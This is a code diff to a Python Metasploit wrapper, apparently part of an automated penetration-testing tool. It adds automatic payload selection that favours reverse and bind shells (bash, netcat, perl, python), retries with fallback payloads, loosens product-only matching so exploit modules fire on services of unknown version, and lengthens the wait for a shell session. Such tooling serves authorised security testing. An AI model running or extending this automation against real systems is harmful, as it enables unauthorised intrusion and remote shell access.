@@ -59,6 +59,9 @@ class MetasploitWrapper:
         self.auto_discover_enabled = msf_config.get('auto_discover', True)
         self.confidence_threshold = msf_config.get('auto_discover_confidence_threshold', 0.6)
         self.auto_save = msf_config.get('auto_save_successful', True)
+        
+        # Session wait timeout (configurable)
+        self.session_wait_timeout = msf_config.get('session_wait_timeout', 30)
     
     def has_module_for(self, service_signature: str) -> bool:
         """Check if we have ANY module for this service (manual or auto-discovered)"""
@@ -85,16 +88,27 @@ class MetasploitWrapper:
             sig_parts = sig_lower.split()
             key_parts = key.split()
             
-            if len(sig_parts) >= 2 and len(key_parts) >= 2:
-                # Match if first word and version prefix match
-                # "samba" in "samba smbd" AND "3.0.20" in "3.0.20-debian"
-                if (sig_parts[0] == key_parts[0] or key_parts[0] in sig_lower):
-                    # Check version match (fuzzy)
-                    for sig_part in sig_parts[1:]:
-                        for key_part in key_parts[1:]:
-                            if sig_part.startswith(key_part) or key_part in sig_part:
-                                print(f"🔍 Fuzzy match: '{sig_lower}' → '{key}'")
-                                return {**self.module_map[key], 'source': 'manual_fuzzy'}
+            if len(sig_parts) >= 1 and len(key_parts) >= 1:
+                # Match product name first
+                product_match = False
+                
+                # Check if the product name matches (first word or contained in signature)
+                if sig_parts[0] == key_parts[0] or key_parts[0] in sig_lower:
+                    product_match = True
+                
+                if product_match:
+                    # If signature has "unknown" version, use product-only match
+                    if 'unknown' in sig_parts:
+                        print(f"🔍 Product-only match (unknown version): '{sig_lower}' → '{key}'")
+                        return {**self.module_map[key], 'source': 'manual_fuzzy', 'fuzzy_reason': 'unknown_version'}
+                    
+                    # Otherwise, check version match (fuzzy)
+                    if len(sig_parts) >= 2 and len(key_parts) >= 2:
+                        for sig_part in sig_parts[1:]:
+                            for key_part in key_parts[1:]:
+                                if sig_part.startswith(key_part) or key_part in sig_part:
+                                    print(f"🔍 Fuzzy match: '{sig_lower}' → '{key}'")
+                                    return {**self.module_map[key], 'source': 'manual_fuzzy', 'fuzzy_reason': 'version_match'}
         
         # Check auto-discovered
         if sig_lower in self.auto_discovered:
@@ -294,14 +308,75 @@ class MetasploitWrapper:
         print(f"💾 Saved module: {service_signature} → {module} "
               f"({entry['success_count']} successes, reliability: {entry['reliability']})")
     
-    def run_exploit(self, module_path: str, options: Dict, payload: str = 'cmd/unix/interact') -> Dict:
+    def get_compatible_payloads(self, exploit_module) -> List[str]:
+        """
+        Get list of compatible payloads for an exploit module.
+        
+        Returns prioritized list of payloads to try:
+        1. cmd/unix/reverse_bash (most reliable)
+        2. cmd/unix/reverse_netcat
+        3. cmd/unix/bind_netcat
+        4. Other common Unix payloads
+        """
+        if not hasattr(exploit_module, 'payloads') or not exploit_module.payloads:
+            # Fallback to common Unix payloads if we can't get the list
+            return [
+                'cmd/unix/reverse_bash',
+                'cmd/unix/reverse_netcat', 
+                'cmd/unix/bind_netcat',
+                'cmd/unix/reverse_perl',
+                'cmd/unix/reverse_python'
+            ]
+        
+        # Filter for Unix command payloads and prioritize
+        unix_payloads = []
+        other_payloads = []
+        
+        # Payloads to exclude (problematic or non-session-creating)
+        exclude_payloads = {
+            'cmd/unix/interact',  # For established connections, not exploitation
+        }
+        
+        for payload_name in exploit_module.payloads:
+            # Skip excluded payloads
+            if payload_name in exclude_payloads:
+                continue
+                
+            if 'cmd/unix/' in payload_name:
+                # Prioritize reverse payloads over bind payloads
+                if 'reverse' in payload_name:
+                    if 'bash' in payload_name:
+                        unix_payloads.insert(0, payload_name)  # Highest priority
+                    elif 'netcat' in payload_name:
+                        unix_payloads.append(payload_name)  # High priority
+                    elif 'perl' in payload_name or 'python' in payload_name:
+                        unix_payloads.append(payload_name)  # Script payloads
+                    else:
+                        unix_payloads.append(payload_name)  # Other reverse payloads
+                elif 'bind' in payload_name:
+                    # Bind payloads (lower priority than reverse)
+                    if 'netcat' in payload_name:
+                        other_payloads.insert(0, payload_name)  # High priority bind
+                    else:
+                        other_payloads.append(payload_name)  # Other bind payloads
+                else:
+                    # Other cmd/unix payloads (add to end)
+                    other_payloads.append(payload_name)
+            elif 'linux/x86/' in payload_name or 'linux/x64/' in payload_name:
+                # Add Linux meterpreter payloads as fallback
+                other_payloads.append(payload_name)
+        
+        # Combine prioritized lists
+        return unix_payloads + other_payloads[:5]  # Limit to reasonable number
+    
+    def run_exploit(self, module_path: str, options: Dict, payload: Optional[str] = None) -> Dict:
         """
         Execute a Metasploit module.
         
         Args:
             module_path: Path to the Metasploit module (e.g., 'exploit/unix/ftp/vsftpd_234_backdoor')
             options: Dictionary of module options (RHOSTS, RPORT, etc.)
-            payload: Payload to use (default: 'cmd/unix/interact')
+            payload: Payload to use (default: auto-select compatible payload)
             
         Returns:
             Dict with success status, session_id, and output
@@ -326,22 +401,84 @@ class MetasploitWrapper:
                     exploit[key] = value
                     print(f"       • {key} = {value}")
             
-            # Execute
-            print(f"    🚀 Executing with payload: {payload}")
+            # Handle payload selection for exploits
+            if module_type == 'exploit':
+                # Get compatible payloads if none specified or if specified payload is invalid
+                if not payload:
+                    compatible_payloads = self.get_compatible_payloads(exploit)
+                    payload = compatible_payloads[0] if compatible_payloads else None
+                    print(f"    🎯 Auto-selected payload: {payload}")
+                else:
+                    # Verify the specified payload is compatible
+                    compatible_payloads = self.get_compatible_payloads(exploit)
+                    if payload not in compatible_payloads:
+                        print(f"    ⚠️  Specified payload '{payload}' not compatible, trying alternatives...")
+                        payload = compatible_payloads[0] if compatible_payloads else None
+                        print(f"    🔄 Using compatible payload: {payload}")
+                
+                # If still no compatible payload, try execution without one (some exploits don't need payloads)
+                if not payload:
+                    print(f"    ⚠️  No compatible payload found, trying without payload...")
+            else:
+                print(f"    📋 Auxiliary module - no payload needed")
+                payload = None
             
             # Store pre-execution session count
             pre_sessions = set(self.client.sessions.list.keys()) if hasattr(self.client.sessions.list, 'keys') else set()
             
-            # Execute the exploit
-            if module_type == 'exploit':
-                job = exploit.execute(payload=payload)
-            else:
-                # Auxiliary modules don't have payloads
-                job = exploit.execute()
+            # Execute the exploit with fallback logic
+            execution_success = False
+            last_error = None
             
-            # Wait for session creation (up to 10 seconds)
+            if module_type == 'exploit' and payload:
+                # Try with the selected payload first
+                try:
+                    print(f"    🚀 Executing with payload: {payload}")
+                    job = exploit.execute(payload=payload)
+                    execution_success = True
+                except ValueError as e:
+                    print(f"    ❌ Payload failed: {e}")
+                    last_error = str(e)
+                    
+                    # Try fallback payloads
+                    compatible_payloads = self.get_compatible_payloads(exploit)
+                    for fallback_payload in compatible_payloads[1:3]:  # Try up to 3 fallbacks
+                        try:
+                            print(f"    🔄 Trying fallback payload: {fallback_payload}")
+                            job = exploit.execute(payload=fallback_payload)
+                            execution_success = True
+                            payload = fallback_payload  # Update to successful payload
+                            print(f"    ✅ Success with fallback payload: {fallback_payload}")
+                            break
+                        except ValueError as e2:
+                            print(f"    ❌ Fallback payload failed: {e2}")
+                            last_error = str(e2)
+                            continue
+                    
+                    if not execution_success:
+                        # Try without payload as last resort
+                        try:
+                            print(f"    🔄 Trying without payload...")
+                            job = exploit.execute()
+                            execution_success = True
+                            payload = None
+                        except Exception as e3:
+                            last_error = str(e3)
+            else:
+                # Auxiliary module or no payload
+                try:
+                    print(f"    🚀 Executing...")
+                    job = exploit.execute()
+                    execution_success = True
+                except Exception as e:
+                    last_error = str(e)
+            
+            if not execution_success:
+                return {'success': False, 'error': f'All payload attempts failed: {last_error}'}
+            
+            # Wait for session creation (configurable timeout)
             import time
-            max_wait = 10
+            max_wait = self.session_wait_timeout
             wait_interval = 0.5
             elapsed = 0
             
